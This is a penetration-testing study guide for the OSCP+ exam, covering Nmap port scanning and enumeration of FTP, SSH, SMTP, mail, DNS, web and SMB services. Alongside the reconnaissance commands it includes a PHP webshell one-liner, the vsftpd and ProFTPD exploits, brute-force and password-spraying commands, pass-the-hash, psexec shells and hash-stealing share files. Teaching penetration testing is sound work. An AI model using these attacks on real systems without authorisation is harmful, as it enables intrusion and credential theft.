# OSCP+ KNOWLEDGE BASE — VOLUME 1
## FINDING OPEN DOORS: SCANNING (NMAP) + ENUMERATING EVERY SERVICE

> **New here? Read this box first — it unlocks every command in this volume.**
>
> **Placeholders you must replace.** Commands use short stand-ins so you can copy them fast. Before anything works you must set the target IP once, and mentally swap the rest:
> ```bash
> export IP=10.10.10.5        # ← run this ONCE per box; now every "$IP" below becomes your target
> mkdir -p scans              # ← make a folder to save scan output into (commands write here)
> ```
> - `$IP` = the target machine's IP address (you just set it above).
> - `$U` = a **username** you found. `$P` = a **password** you found. Type the real value in place of them.
> - `<something>` = "put your own value here" (e.g. `<domain>` = the target's domain name like `corp.local`).
> - `scans/all-tcp.txt` = just a filename to save results into, so you don't lose them.
>
> **The tags.** Each section has a `[TAG]` in square brackets (like `[ENUM-SMB]`). Tags are **bookmarks**: when a line says *"→ `[WEB-QUICK]`"* it means *"go read that section next"* — press **Ctrl+F**, type the tag, jump there. Difficulty labels:
> - `[MUST-MEMORIZE]` = learn it by heart, you'll type it on every box.
> - `[MUST-RECOGNIZE]` = you don't need it memorized, but know what it does when you see it.
> - `[LOOK-UP]` = niche; fine to look up during the exam, don't cram it.
>
> **The golden habit:** *enumerate everything before attacking anything.* Most beginners fail by rushing the first open port. Scan all ports, then look at **every** service, then pick the easiest way in.

---

# [NMAP] SCANNING — finding which doors are open

**What is Nmap?** A port scanner. A "port" is a numbered door on a computer (0–65535); a program listening behind a door is a "service" (web server, file share, database…). Nmap knocks on the doors and tells you which are **open** and what's behind them. This is always your **first step** on a new target.

## [NMAP-QUICK]  the three scans you'll run on every box  (one screen)
```bash
# 1) Fast: knock on ALL 65535 doors, just tell me which are OPEN   [MUST-MEMORIZE]
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
#    -p-           = scan every port (not just the common 1000)
#    --min-rate 2000 = go fast (send ≥2000 packets/sec); lower to 1000 if results look flaky
#    -Pn           = "assume host is up, skip the ping" (many boxes block ping and look 'down')
#    -oN file      = save a readable copy to that file (ALWAYS save — you'll re-read it)

# 2) Deep: for the ports found open, get the software + version + run default checks   [MUST-MEMORIZE]
nmap -p22,80,445 -sCV -Pn -oN scans/services.txt $IP
#    -p22,80,445   = only the ports step 1 found open (replace with your real list)
#    -sC           = run Nmap's "default scripts" (safe probes that reveal extra info)
#    -sV           = detect the exact service + version (e.g. "Apache 2.4.49") → search it for exploits
#    (-sCV is just -sC and -sV together)

# 3) UDP: a few services only answer on UDP (different protocol) — scan the top ones   [MUST-RECOGNIZE]
nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $IP
#    -sU           = scan UDP instead of TCP
#    --top-ports 100 = only the 100 most common UDP ports (full UDP is painfully slow)
```
**Read the results like this:**
- Step 1 tells you *which* doors are open. Note every number.
- Step 2 tells you *what program + version* is behind each door → that version is what you search for known exploits.
- Step 3 catches UDP-only services (SNMP on 161, DNS on 53, TFTP on 69) that TCP scans miss.

## [NMAP-TCP]  the standard two-step, explained  [PRACTICAL]
**Why two steps?** Scanning all 65535 ports *with* version detection is very slow. So: **step 1** finds open ports fast (no version detection); **step 2** does the slow version/script work **only** on the handful that were open. Never run `-sCV -p-` together — you'll wait forever.

**The flags that matter (and what each is for):**
- `-p-` → scan all 65535 ports. Without it, Nmap only checks the common 1000 and **misses services on weird high ports** (a very common way beginners miss the way in).
- `--min-rate 2000` → speed. If a box is fragile and results change between runs, drop to `--min-rate 1000`.
- `-Pn` → skip the "is it alive?" ping. Windows and firewalled boxes often block ping and would otherwise be wrongly reported as "down". **Always use `-Pn`.**
- `-sC` (default scripts), `-sV` (versions) → the info that tells you *how* to attack.
- `-oN scans/file.txt` (readable) or `-oA scans/name` (saves 3 formats at once) → **always save output.** You will re-read scans constantly.
- `-T4` → a coarser speed dial; `--min-rate` is the finer control. Either is fine.

**One-command version (fine for a single box, just slower):**
```bash
nmap -p- -sCV -Pn --min-rate 1500 -oA scans/full $IP    # all ports + versions in one go
```
**Faster port discovery (optional tool):** `rustscan -a $IP -- -sCV -oN scans/services.txt` — rustscan finds open ports very fast, then hands them to Nmap. `[LOOK-UP]`

## [NMAP-UDP]  [PRACTICAL]
UDP scanning is slow and unreliable (UDP services often don't reply, so Nmap has to guess). **Scan the top 100–200 UDP ports, never all of them.**
```bash
nmap -sU --top-ports 200 --min-rate 1000 -Pn $IP
```
- `open|filtered` = "no reply, can't tell" — normal for UDP. For a promising one, probe it directly with its own tool.
- **High-value UDP ports to care about:** 161 (SNMP — often leaks creds!), 53 (DNS), 69 (TFTP), 123 (NTP), 500 (IKE/VPN), 137 (NetBIOS).

## [NMAP-SERVICE-ENUM] / [NMAP-SCRIPTS]  running targeted checks  [PRACTICAL]
Nmap ships with hundreds of small scripts (the "NSE"). You can aim specific ones at a service:
```bash
nmap --script "safe or default" -p<ports> $IP          # run all the safe/standard checks
# service-specific bundles:
nmap --script "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode" -p445 $IP   # SMB
nmap --script "http-enum,http-title,http-headers,http-methods" -p80 $IP                        # web
nmap --script "ftp-anon,ftp-syst" -p21 $IP                                                     # FTP
nmap --script vuln -p<ports> $IP     # broad "any known vulns?" — NOISY, gives false alarms [LOOK-UP]
```
- Treat `--script vuln` as a **lead generator, not proof** — it flags maybes; you still verify by hand.
- Find a script: `ls /usr/share/nmap/scripts | grep <service>`. Read what it does: `nmap --script-help <name>`.

## [NMAP-TROUBLESHOOTING]  when a scan misbehaves
| What you see | Why | What to do |
|---|---|---|
| Every port says "filtered" | A firewall is dropping your probes, or ping is blocked | Add `-Pn`; lower `--min-rate`; try `-sT` (full-connect scan), especially through a proxy |
| Host reported "down" but the website loads | Ping (ICMP) is blocked | Always use `-Pn` |
| Version looks wrong / "unsure" | The service hides its banner | Probe by hand (`nc`, `curl`, the service's own client); add `--version-intensity 9` |
| Scan is crawling | UDP, or too-high rate on a lossy link | UDP: top-ports only. TCP: `--min-rate 1000` |
| Fails through proxychains | SOCKS proxies can't carry raw SYN/UDP packets | Use `-sT -Pn` (TCP connect) only; no UDP over a proxy |
| Different results each run | Rate too high, packets getting dropped | Lower `--min-rate`, run again |
| Box is clearly up but almost everything is "filtered" | possible **port knocking** (a service opens only after you connect to a secret sequence of ports first) | look for the knock sequence in a config/README/comment you looted; then `for p in 7000 8000 9000; do nmap -Pn -p $p $IP; done` and re-scan — the hidden port opens |

**Time-wasters to avoid (rabbit holes):** believing `--script vuln` without checking; obsessing over a single "filtered" port; running full UDP `-p-`; fussing over exact OS-detection guesses.

---

# ENUMERATING EACH SERVICE — what to do behind every open door

> For each service: **what it is** (plain English) → **commands** (every line commented) → **what to check, what can go wrong, and where it leads.** Jump straight to the port you found open using the decision table at the bottom (`[ENUM-DECISION]`).

## [PORT-PLAYBOOK]  the ports to recognise on sight + your FIRST move
When nmap comes back, don't panic at the list — recognise each port and reach for its first move. **Attack priority: web (80/443) → SMB (445) → AD (88/389) → databases → the rest.**

| Port(s) | Protocol / service | What it is (plain English) | Your FIRST move | Jump |
|---|---|---|---|---|
| 21 | FTP | file transfer, often **anonymous** | try `anonymous`/any-pass; download everything; can you upload? | `[ENUM-FTP]` |
| 22 | SSH | remote login shell | note the version; only useful with a **found** password/key (don't brute) | `[ENUM-SSH]` |
| 23 | Telnet | ancient cleartext login | grab banner; try creds you have | `[ENUM-UNUSUAL-PORTS]` |
| 25/465/587 | SMTP | mail | enumerate **usernames** (`VRFY`, `RCPT`) → feed AD attacks | `[ENUM-SMTP]` |
| 53 | DNS | name lookups | attempt a **zone transfer**; on AD it reveals DCs | `[ENUM-DNS]` |
| 80/443/8080/8000 | HTTP(S) | ⭐ a **website** — #1 foothold | enumerate FULLY: `whatweb`, dir-brute, **version→exploit** | `[WEB-QUICK]` |
| 88 | Kerberos | AD authentication | 🚨 **it's a DOMAIN CONTROLLER** — switch to AD mode | `[ENUM-KERBEROS]` / `[AD-QUICK]` |
| 110/143 | POP3/IMAP | mailboxes | test found creds; read mail for secrets | `[ENUM-UNUSUAL-PORTS]` |
| 111 | RPCbind | Unix RPC → points to NFS | `showmount -e` to find NFS exports | `[ENUM-NFS]` |
| 135 | MSRPC | Windows RPC | `rpcclient -U '' -N` null session → users | `[ENUM-RPC]` |
| 139/445 | SMB | ⭐ Windows file sharing | `nxc smb`; try **null session** shares/users | `[ENUM-SMB]` |
| 161 (UDP) | SNMP | device monitoring | `snmpwalk -c public` → **creds in process args** (easy win) | `[ENUM-SNMP]` |
| 389/636/3268 | LDAP | the AD directory | anonymous bind dump; passwords hide in `description` | `[ENUM-LDAP]` |
| 623 (UDP) | IPMI | server management | dump the **pre-auth hash** → crack it | `[ENUM-IPMI]` |
| 631 | CUPS/IPP | Linux printing | CVE-2024-4717x → unauth RCE (niche/recent) | `[ENUM-CUPS]` |
| 1433 | MSSQL | MS SQL Server database | creds → `xp_cmdshell` **RCE** | `[ENUM-MSSQL]` |
| 1521 | Oracle | Oracle database | SID-guess → default creds (`scott/tiger`) → RCE | `[ENUM-ORACLE]` |
| 2049 | NFS | Unix file shares | mount it; **`no_root_squash`** → root | `[ENUM-NFS]` |
| 3306 | MySQL | database | try `root`/blank; `FILE` priv → read/write files | `[ENUM-MYSQL]` |
| 3389 | RDP | remote desktop (GUI) | test creds → `xfreerdp` login | `[ENUM-RDP]` |
| 5432 | PostgreSQL | database | try `postgres`/blank; `COPY ... PROGRAM` → RCE | `[ENUM-POSTGRES]` |
| 5900 | VNC | remote desktop | auth-bypass / crack the VNC password / connect | `[ENUM-VNC]` |
| 5985/5986 | WinRM | remote PowerShell | `nxc winrm` creds → `evil-winrm` **shell** | `[ENUM-WINRM]` |
| 6379 | Redis | in-memory DB, **often no auth** | connect; write a webshell / SSH key | `[ENUM-REDIS]` |
| 27017 | MongoDB | NoSQL DB, often no auth | dump collections → creds/tokens | `[ENUM-MONGODB]` |
| 2375/2376 | Docker API | container engine | unauth API → **host root** | `[ENUM-DOCKER]` |
| 23 | Telnet | cleartext login | banner + default creds → shell | `[ENUM-TELNET]` |
| 69 (UDP) | TFTP | no-auth file transfer | grab router/VoIP configs → creds | `[ENUM-TFTP]` |
| 79 | Finger | user info | enumerate usernames | `[ENUM-FINGER]` |
| 110/143 | POP3/IMAP | mailboxes | read mail with creds → more creds | `[ENUM-POP-IMAP]` |
| 123 (UDP) | NTP | time | monlist → internal hosts; clock-sync for Kerberos | `[ENUM-NTP]` |
| 873 | rsync | file sync | list modules → read/write files | `[ENUM-RSYNC]` |
| 8009 | AJP (Tomcat) | Tomcat connector | **Ghostcat** CVE-2020-1938 → read web.xml/RCE | `[ENUM-AJP]` |
| 8080 | Tomcat | Java app server | Manager → deploy `.war` → RCE | `[ENUM-AJP]` |
| 9200/9300 | Elasticsearch | search DB | no-auth dump; old ver → RCE | `[ENUM-ELASTIC]` |
| 11211 | Memcached | cache | no-auth → dump cached creds/sessions | `[ENUM-MEMCACHED]` |
| 4505/4506 | SaltStack (salt-master) | config-mgmt over ZeroMQ — runs as **root** | CVE-2020-11651 → unauth RCE = **instant root** | `[ENUM-SALTSTACK]` |

**The instant "tells" — train these gut reactions:**
- **Port 88 open → it's a Domain Controller → go AD** (BloodHound, roasting, spraying).
- **445 with `signing:False` → NTLM relay is possible** (lab only; poisoning is banned on the exam).
- **Anonymous FTP / null SMB / world-readable NFS → free files — loot them first.**
- **A database port (1433/3306/5432) + a credential → usually the fastest RCE.**
- **A version number on ANY service → `searchsploit` / CVE it immediately** (`[EXPLOIT-RESEARCH]`).
- **161 SNMP → `snmpwalk` is a low-effort credential jackpot** (passwords in process arguments).
- **Lots of high ports 49152+ on Windows → normal RPC plumbing, ignore them.**

**Golden habit:** the open ports are a **menu, not a checklist in order** — enumerate them all, then attack the *easiest* win first (web, SMB, or a known-version exploit).

## [ENUM-FTP]  Port 21 — FTP (file transfer) — FULL CHAIN
**What it is:** file upload/download. Goldmine when **anonymous** login is allowed. Three things decide everything: (1) can you log in? (2) can you **read** files? (3) can you **write** files? Plus the **version** (some have public exploits).

### 🗺️ Decision tree
```
nmap ftp-anon →  anonymous allowed?   YES → log in → can you WRITE (put)?
                                              ├─ write + it's the WEB ROOT → upload a webshell → RCE
                                              ├─ write (ProFTPD mod_copy) → copy a shell into web root
                                              └─ read-only → LOOT everything → reuse creds
                 NO  →  check the VERSION → public exploit?  (vsftpd 2.3.4 backdoor / ProFTPD mod_copy / CVEs)
                        else → try found/default creds → else brute (last resort, with a known user)
ALWAYS: loot every file you can read; every cred found → spray everywhere.
```

### Step 1 — Identify (version + anonymous)
```bash
nmap -p21 -sCV --script "ftp-anon,ftp-syst,ftp-bounce" $IP    # version + anon + system type
nc -nv $IP 21                                                  # banner by hand (exact version string)
```
- Note the **exact version** (e.g. `vsftpd 3.0.3`, `ProFTPD 1.3.5`) → Step 4 if no anon.
- `ftp-anon: Anonymous FTP login allowed` → Step 2.

### Step 2 — Log in (anonymous first — cheapest)
```bash
ftp $IP                                   # user: anonymous   pass: anonymous (or just Enter)
# non-interactive:
curl ftp://$IP/ --user anonymous:anonymous             # list root
wget -r --no-passive ftp://anonymous:anonymous@$IP/    # MIRROR everything recursively
```
Inside the `ftp>` prompt: `ls -la`, `cd`, `get <file>`, `binary` (before getting binaries or they corrupt), `mget *`.

### Step 3 — Decide by what you can do
**3a. Can you WRITE?** (the big win) — test it:
```bash
# in ftp:  put /etc/hostname test.txt    → "226 Transfer complete" = you can WRITE
```
- **Write + FTP root == web root** (confirm: is there a web server, does `http://$IP/test.txt` show it?) → **upload a webshell**:
  ```bash
  # make shell.php  <?php system($_GET['c']); ?>  → put shell.php → visit http://$IP/shell.php?c=id → [WEB-UPLOAD]
  ```
- **Write but NOT web root** → drop an `.ssh/authorized_keys` if the FTP user's home is writable, or just stage files.

**3b. Read-only?** → **LOOT everything** and move the creds elsewhere:
```bash
# hunt in what you downloaded:
grep -rniE 'pass|pwd|user|secret|key|token' .        # in the mirrored files
# juicy files: config.*, web.config, .env, wp-config.php, *.bak, backups, .txt notes, source, id_rsa, .kdbx
```
Any cred/key found → `[CREDENTIALS-QUICK]` (try on SSH/SMB/web/etc.).

### Step 4 — No anonymous → version exploits + creds
```bash
searchsploit <product> <version>         # e.g. searchsploit proftpd 1.3.5
```
Known OSCP-relevant FTP bugs:
- **vsftpd 2.3.4** → backdoor: a username ending in `:)` opens a **root shell on port 6200** → `nc $IP 6200` → `id`. (`[ENUM-SALTSTACK]`-style CVE entry: CVE-2011-2523)
- **ProFTPD 1.3.5** → `mod_copy` (`SITE CPFR`/`SITE CPTO`, unauthenticated) → copy a file into the **web root** → webshell. (CVE-2015-3306)
- **ProFTPD 1.3.3c** → backdoor. · **Pure-FTPd/others** → check searchsploit.
- No exploit → try creds you found elsewhere, default creds (`admin/admin`, product defaults), THEN brute as last resort:
  ```bash
  hydra -l <known-user> -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4   # only with a real username + reason
  ```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| downloads corrupt / truncated | type `binary` before `get` |
| `ftp` hangs on listing | passive/active mismatch → `passive` in the prompt, or `wget --no-passive` |
| anon "530 Login incorrect" | anon disabled → version exploit / found creds |
| `put` → "550 Permission denied" | read-only → loot path (3b) |
| can write but webshell 404 | FTP root ≠ web root → stage SSH key / just loot instead |

**Leads to:** webshell → `[WEB-UPLOAD]`; creds/keys → `[CREDENTIALS-QUICK]`; version backdoor → shell → `[LINUX-PRIVESC]`.

## [ENUM-SSH]  Port 22 — SSH (remote login shell) — FULL CHAIN
**Big idea:** SSH is almost never the way *in* — it's the **reward**. You find a password or a private key *elsewhere* (a file, share, DB, web app) and then log in. Don't brute SSH head-on except as a true last resort.

### 🗺️ Decision tree
```
do you have creds/a key (from another service)?
   YES key → chmod 600 → ssh -i (passphrase? → crack with ssh2john)
   YES pass → ssh user@ip  (and reuse that pass on every other service)
   NO → note the VERSION (public exploit? user-enum?) ; try default/found creds ; brute ONLY with a known user
also: old key algos → add -o flags ; username leaks → build a user list
```

### Step 1 — Identify
```bash
nmap -p22 -sCV $IP                                  # banner → OpenSSH version + OS/distro hint
nc -nv $IP 22                                        # raw banner
ssh-audit $IP                                        # (if installed) weak algos / version issues
```
- Note the exact **OpenSSH version** → Step 4 (some have user-enum / rare RCE).

### Step 2 — Log in with a KEY you found (the common path)
```bash
chmod 600 id_rsa                                     # SSH refuses world-readable keys
ssh -i id_rsa <user>@$IP                             # try likely users: root, admin, the box name, names you looted
# passphrase-protected key? crack it:
ssh2john id_rsa > key.hash ; john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```
> Which user? the key's `authorized_keys` comment, `/etc/passwd` names, web app users, or the key's filename/path.

### Step 3 — Log in with a PASSWORD you found
```bash
ssh <user>@$IP                                       # paste the found password
sshpass -p '<pass>' ssh <user>@$IP                   # non-interactive
# EVERY password you find → also try on SMB/web/FTP/other users (reuse!) → [CREDENTIALS-QUICK]
```

### Step 4 — No creds yet → version angles + (last-resort) brute
```bash
searchsploit openssh <version>                       # user-enum (OpenSSH < 7.7: CVE-2018-15473), rare RCEs
# username enumeration (OpenSSH < 7.7):
# python3 ssh-user-enum.py --port 22 --userList users.txt $IP   [LOOK-UP]
# default creds: root/root, root/toor, admin/admin, <product> defaults
# brute (LAST resort — slow/noisy, needs a KNOWN user, DON'T use full rockyou on all users):
hydra -l <known-user> -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -V
```

### Step 5 — Once in: pivot + loot
```bash
ssh -D 1080 <user>@$IP                               # dynamic SOCKS → proxychains (pivot) → [PIVOT-SSH]
cat ~/.ssh/authorized_keys ~/.ssh/known_hosts        # leaks OTHER users + OTHER hosts to attack
cat ~/.bash_history                                   # creds/commands
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `Permission denied (publickey)` | wrong key or wrong username — try other users |
| key `UNPROTECTED PRIVATE KEY FILE` | `chmod 600 id_rsa` |
| `no matching key exchange/host key type` (old server) | `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa <user>@$IP` |
| `no matching cipher` | add `-c aes256-cbc` (or the cipher the server lists) |
| password login refused, only key | `PasswordAuthentication no` → you need a key; find one elsewhere |

**Leads to:** a foothold → `[LINUX-PRIVESC-QUICK]` · tunneling → `[PIVOT-SSH]`.

## [ENUM-SMTP]  Ports 25/465/587 — Mail (SMTP) — FULL CHAIN
**What it is:** the mail-sending service. Main OSCP value: **enumerate valid usernames** (the server confirms which users exist) → feed them into spraying/AD roasting. Occasionally: open relay, version exploit, or creds to read mail.

### 🗺️ Decision tree
```
grab banner (software+version) → try user-enum (VRFY / EXPN / RCPT):
   got usernames? → save users.txt → spray / AD roast / SSH-user guess
   version has a CVE? → searchsploit (e.g. old Exim/Sendmail RCEs)
   open relay? → note it (rarely the path on OSCP)
   have creds? → log in (POP/IMAP) → read mail for more creds/hints
```

### Step 1 — Banner + capabilities
```bash
nmap -p25,465,587 -sCV --script "smtp-commands,smtp-open-relay,smtp-enum-users" $IP
nc -nv $IP 25                  # then type:  EHLO x    (lists VRFY/EXPN support + internal hostname)
```
- Note the **software + version** (Postfix/Exim/Sendmail/Microsoft) → Step 4 if it's old.

### Step 2 — Enumerate users (the main win)
```bash
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t $IP   # RCPT method (most reliable)
smtp-user-enum -M VRFY -U users.txt -t $IP                                       # VRFY method
# by hand (nc $IP 25):
#   VRFY root            → 252/250 = exists, 550 = no
#   RCPT TO:<bob@domain> → (after MAIL FROM:<x@x>)  250 = exists
```
Save confirmed users → `users.txt` → **spray / AD roast** (`[AD-QUICK]`) / try as SSH usernames.

### Step 3 — Have creds? Read the mailbox (POP3/IMAP)
```bash
# mail usually also on 110(POP3)/143(IMAP) — see [ENUM-POP-IMAP]
```

### Step 4 — Version exploit / relay
```bash
searchsploit exim ; searchsploit sendmail          # old MTAs have RCEs (e.g. Exim CVE-2019-10149)
# open relay (noted by nmap smtp-open-relay) — rarely useful on OSCP; note it and move on
```

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| VRFY returns 252 for everything | server can't verify (always-accept) → use the **RCPT** method instead |
| connection drops after a few probes | rate-limited/greylisted → slow down (`-M RCPT` with delays), fewer names |
| 503 bad sequence | send `MAIL FROM:<a@a>` before `RCPT TO:` |

**Leads to:** usernames → `[AD-QUICK]` / spray `[CREDENTIALS-QUICK]`; version → `[EXPLOIT-RESEARCH]`.

## [ENUM-POP-IMAP]  Ports 110/143 (+995/993 TLS) — POP3 / IMAP (mailboxes) — FULL CHAIN
**What it is:** read mail *with creds*. Mailboxes often contain **passwords, password-reset links, internal info** → reuse.
### 🗺️ Decision tree
```
110/143 open → do you HAVE a credential (found anywhere)? →
  yes → log in (nc/openssl/curl) → read EVERY mail →
     mail contains a password / reset link / internal hint? → REUSE it everywhere → [CREDENTIALS-QUICK]
     nothing useful → note the addresses (they're valid usernames) → feed spraying/AD
  no credential → this is a PAYOFF service, not a way in →
     got a username list (finger/SMTP/web)? AND a password policy that's safe? →
        brute ONE known user (hydra pop3/imap, slow) → login
     else → come back once another service gives you creds
```
```bash
nmap -p110,143,993,995 -sCV $IP                    # version + capabilities
nc -nv $IP 110                                       # POP3:  USER <u> / PASS <p> / LIST / RETR 1
openssl s_client -connect $IP:995 -quiet            # POP3S (TLS)
curl -k "imaps://$IP" --user '<u>:<p>'               # IMAP over TLS
# in IMAP (143):  a LOGIN <u> <p> / a LIST "" "*" / a SELECT INBOX / a FETCH 1 BODY[]
hydra -l <u> -P rockyou.txt pop3://$IP                # brute (last resort, KNOWN user)
```
- **Leads to:** creds/hints inside emails → reuse `[CREDENTIALS-QUICK]`; valid addresses → user list for spraying.

## [ENUM-DNS]  Port 53 — DNS (name lookups) — FULL CHAIN  → also `[TECH-DNS]`
**What it is:** the phone book (names ↔ IPs). Jackpot = a **zone transfer** (dumps every internal hostname at once). On AD, DNS reveals the Domain Controllers.

### 🗺️ Decision tree
```
find the domain name (from nmap -sCV, SMB/LDAP, a web cert, /etc/hosts redirect) →
   try ZONE TRANSFER (axfr) →  success? → dump ALL records → add every host to /etc/hosts → attack them
                               fail?    → brute subdomains ; reverse-lookup the subnet ; AD SRV records
```

### Step 1 — Find the domain, then try a zone transfer
```bash
nmap -p53 -sCV --script "dns-nsid,dns-recursion" $IP
# get the domain from: nmap -sCV, `nxc smb $IP` (domain field), a TLS cert CN/SAN, or a web redirect
dig axfr @$IP <domain>                      # ⭐ ZONE TRANSFER — the big win (dumps all records)
dig axfr @$IP                                # try with no domain too
host -l <domain> $IP                         # alternative axfr
dnsrecon -d <domain> -a -n $IP               # automated (includes axfr)
```

### Step 2 — If AXFR fails
```bash
dnsrecon -d <domain> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brute
dnsenum <domain>
dig -x $IP @$IP                              # reverse lookup (IP → hostname)
nslookup -type=SRV _ldap._tcp.<domain> $IP   # AD: find Domain Controllers
nslookup -type=any <domain> $IP
```

### Step 3 — Act
- **Every hostname you discover → `/etc/hosts`:** `echo "$IP  host.domain.local" | sudo tee -a /etc/hosts`.
- New hostnames → fuzz each as a **vhost/website** (`[WEB-CONTENT]`); a `*.corp.local` set → you're in **AD** (`[AD-ENUM]`).

### 🧯 Troubleshooting
| Symptom | Fix |
|---|---|
| `Transfer failed` / `connection refused` | AXFR not allowed → brute subdomains instead |
| don't know the domain | get it from SMB (`nxc smb $IP`), a TLS cert, or an HTTP redirect to a hostname |
| TCP vs UDP | AXFR uses **TCP/53**; make sure 53/tcp is reachable |

**Leads to:** vhosts → `[WEB-CONTENT]`; DC discovery → `[AD-ENUM]`.

## [ENUM-HTTP] / HTTPS  Ports 80/443/8080/8000/8443/… — Web
**What it is:** a website. This is the **#1 way into most boxes.** Enumerate **every** HTTP port thoroughly — the full method is Volume 2 (`[WEB-*]`). Quick first look:
```bash
whatweb http://$IP        # identify the tech stack (server, CMS, frameworks)
curl -sI http://$IP       # show just the response headers (server type, redirects, cookies)
# then: view page source · read /robots.txt · brute-force hidden directories · brute-force vhosts
```
### 🗺️ Decision tree (what you find → which VOL-2 attack to open)
```
web port open → whatweb + curl -sI + feroxbuster + view-source + /robots.txt →
  it's a named CMS/product (version)? → searchsploit it + [VERSION-VULN-MAP] →
       WordPress → wpscan + plugin exploits ; Tomcat → [ENUM-AJP] ; Drupal/Joomla → known RCE
  a LOGIN page?                → default/weak creds → SQLi auth bypass (admin'-- -) → [WEB-AUTHBYPASS]
  a FILE-UPLOAD page?          → webshell past the filter → [WEB-UPLOAD]
  a URL param ?id=1 / ?page=   → test it:
       error on quote / UNION works → [WEB-LFI] isn't it; it's SQLi → [SQLI]
       ?page=/file / ?file= reads a file → [WEB-LFI] (→ RCE via log poison / php filter)
       input echoed into a command → [WEB-CMDINJ] ; into a template (49 from {{7*7}}) → [WEB-SSTI]
       server fetches a URL you give → [WEB-SSRF] ; XML parsed → [WEB-XXE]
  a redirect to a HOSTNAME?    → add to /etc/hosts → fuzz vhosts (ffuf -H "Host: FUZZ.domain")
  a 403/401 on a dir?          → [WEB-403-BYPASS] ; HTTP PUT allowed? → [WEB-PUT-WEBDAV]
  exposed /.git ?              → [ENUM-GIT] (dump source + secrets)
  NOTHING obvious?             → re-read source/JS/comments, fuzz params, deeper dir brute → don't leave web early
```
**Look for:** the CMS and its version (→ exploits), redirects to a hostname (→ vhost fuzz), login/upload pages, and URL parameters to test for injection.
**Where it leads:** SQLi / LFI / upload / cmd-injection / SSTI / a known-version exploit → your first shell. **The full method + every attack is `[WEB-QUICK]` → the `[WEB-*]` sections in Volume 2.**

## [ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also `[TECH-SMB]`
**What it is:** Windows file-and-printer sharing. On a Windows/AD network it's the workhorse: you can sometimes list shared folders and usernames **without any password** ("null session"), test whether creds work, move between machines, and loot files left in shares.

### [SMB-QUICK]  first look  (one screen)
```bash
nxc smb $IP                              # basic info: OS, hostname, domain, signing   [MUST-MEMORIZE]
nxc smb $IP -u '' -p '' --shares         # try to list shared folders with NO credentials (null session)
nxc smb $IP -u 'guest' -p '' --shares    # fallback: try the "guest" account
enum4linux-ng -A $IP                     # throw everything at it automatically (users, shares, policy)
smbclient -N -L //$IP/                   # another way to list shares with no creds (-N = no password)
smbclient -N //$IP/<share>               # connect INTO a share; then use: ls, get <file>, recurse ON
```
> **What is `nxc`?** `nxc` (NetExec, formerly CrackMapExec/`cme`) is a Swiss-army knife for Windows protocols (SMB, WinRM, LDAP, MSSQL…). You'll use it constantly. `smbclient` is a simpler one-share file browser.

**Look for:** `signing:False` (means NTLM-relay attacks are possible), folders you can **read** or **write**, usernames, and the domain name. **Next:** read every readable share; try any found password on other accounts.

### [SMB-ENUM]  deeper enumeration
```bash
nxc smb $IP -u '' -p '' --shares --users     # null session: list shares AND users
nxc smb $IP -u guest -p '' --shares          # guest fallback
nxc smb $IP -u '' -p '' --rid-brute          # pull usernames by cycling ID numbers (works with no creds)
smbclient -N //$IP/Share                      # browse a share; inside: 'recurse ON', 'prompt OFF', then 'mget *'
mount -t cifs //$IP/Share /mnt/s -o username=$U,password=$P   # mount a share locally so you can grep it [LOOK-UP]
nxc smb $IP -u $U -p $P --shares --users --pass-pol --groups  # with creds: full enumeration
nxc smb <hosts.txt> -u users.txt -p 'Password1' --continue-on-success   # spray ONE password at many users/hosts
nxc smb $IP -u $U -H <ntlmhash>              # log in with a HASH instead of a password ("pass-the-hash")
nmap --script smb-vuln-ms17-010 -p445 $IP   # check for EternalBlue (old, unpatched Windows)
```
> **"Spraying"** = trying one likely password against many usernames (safer than hammering one user, which can lock the account). **"Pass-the-hash"** = Windows lets you authenticate with the password's *hash* (a scrambled fingerprint) even if you never cracked the actual password.

**Files worth grabbing from shares:** `Groups.xml` / GPP files (contain an encrypted-but-crackable `cpassword`), login scripts, `web.config`, `unattend.xml`, backups, `.kdbx` (KeePass), `.ps1` scripts, sticky-notes.
**Common misconfigs:** null/guest read access · a **writable** share (drop a `.scf`/`.lnk` file to steal a hash) · SMB signing off (relay attacks).
**Known vulns:** MS17-010 "EternalBlue" (old boxes) · GPP `cpassword`.

### [SMB-ATTACK]  turning SMB access into a shell
```bash
impacket-psexec $U:$P@$IP        # get a SYSTEM shell using ADMIN creds — reliable but "loud"
impacket-wmiexec $U:$P@$IP       # run commands more quietly (no service created)
nxc smb $IP -u $U -p $P -x whoami   # run a single command and see the output
# writable share → drop a malicious .scf/.url/.lnk, run Responder/ntlmrelayx to catch the hash [LOOK-UP]
```
See `[AD-LATERAL]` (Volume 5) for the full "move to another machine" menu.

### [SMB-TROUBLESHOOTING]
| What you see | Meaning / fix |
|---|---|
| `NT_STATUS_ACCESS_DENIED` when listing | null session is disabled → you need real creds |
| `STATUS_LOGON_FAILURE` | wrong creds — check the domain: add `-d DOMAIN` or use `-u DOMAIN/user` |
| `STATUS_ACCOUNT_RESTRICTION` | that account isn't allowed to use SMB / only on certain hosts |
| smbclient: "protocol negotiation failed" | ancient SMBv1 → `smbclient --option='client min protocol=NT1'` |
| `STATUS_NOT_SUPPORTED` | SMBv1 disabled (fine) → use nxc / SMB2 |
| Kerberos "clock skew" errors | your clock differs from the DC → `sudo ntpdate $IP` |

**Where it leads:** creds, loot, moving laterally, and full AD enumeration → `[FOUND-SMB]`, spray creds, `[AD-ENUM]`.

## [ENUM-RPC]  Port 135 MSRPC (Windows) / Port 111 rpcbind (Unix) — FULL CHAIN
**What it is:** **135** = Windows RPC endpoint mapper — a **null session** here can leak **users, groups, domain info** (sometimes when SMB blocks it). **111** = Unix portmapper — points you at **NFS** and other RPC services.

